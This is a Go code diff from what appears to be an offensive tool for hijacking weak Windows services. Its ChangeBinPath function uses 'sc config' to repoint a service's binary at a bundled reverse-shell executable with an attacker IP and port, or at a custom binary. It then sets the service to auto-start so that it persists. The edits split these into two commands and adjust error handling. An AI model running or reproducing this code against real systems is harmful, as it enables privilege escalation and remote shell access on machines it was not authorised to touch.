@@ -42,6 +42,7 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 
 		malPath := fmt.Sprintf(homeDir + `/win-binary-hijacking/internal/malbinaries/revshell.exe`)
 
+		fmt.Println(malPath)
 		// Formatting sc config portion here
 
 		if serv.CanStart && serv.CanStop {
@@ -49,9 +50,7 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 		} else {
 			m.CD.Println("Insufficient permissions to start and stop this service.")
 			m.CD.Println("Setting START_TYPE to AUTO")
-			cmdFormat = fmt.Sprintf(`start=auto binpath=%s %s %s`, malPath, hostIP, hostPort)
-			startAuto = true
-
+			cmdFormat = fmt.Sprintf(`binpath=%s %s %s`, malPath, hostIP, hostPort)
 		}
 
 		cmd := exec.Command("sc", "config", serv.Name, cmdFormat)
@@ -60,8 +59,24 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 
 		if err != nil {
 			m.CD.Printf("Error changing binary path for service: %s: %v\n", serv.Name, err)
+			os.Exit(1)
+
 		} else {
 			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
+
+			// Changing start type of the service here
+			// Putting it in the same sc config while changing binpath
+			// was not working as expected. Running bin path change and start
+			// type change in two different commands now.
+			cmd = exec.Command("sc", "config", serv.Name, "start=auto")
+
+			err = cmd.Run()
+
+			if err != nil {
+				fmt.Println("ERROR: Error changing service start type to auto: ", err)
+			} else {
+				startAuto = true
+			}
 			serv.BinPath = malPath + " " + hostIP + " " + hostPort
 			if startAuto {
 				serv.StartMode = "AUTO_START"
@@ -76,7 +91,8 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 		r, err := fmt.Scanln(&customBin)
 
 		if r != 1 || err != nil {
-			panic("Trouble processing custom binary path")
+			m.CD.Println("Trouble processing custom binary path")
+			os.Exit(1)
 		}
 
 		// Formatting sc config portion here
@@ -86,8 +102,7 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 		} else {
 			m.CD.Println("Insufficient permissions to start and stop this service.")
 			m.CD.Println("Setting START_TYPE to AUTO")
-			cmdFormat = fmt.Sprintf(`start=auto binpath="%s"`, customBin)
-			startAuto = true
+			cmdFormat = fmt.Sprintf(`binpath="%s"`, customBin)
 
 		}
 
@@ -99,6 +114,19 @@ func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
 			m.CD.Printf("Error changing binary path for service: %s: %v\n", serv.Name, err)
 		} else {
 			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
+
+			// Similiar to above - running bin path change and start type change
+			// in two different commands now.
+			cmd = exec.Command("sc", "config", serv.Name, "start=auto")
+
+			err = cmd.Run()
+
+			if err != nil {
+				fmt.Println("ERROR: Error changing service start type to auto: ", err)
+			} else {
+				startAuto = true
+			}
+
 			serv.BinPath = customBin
 
 			if startAuto {
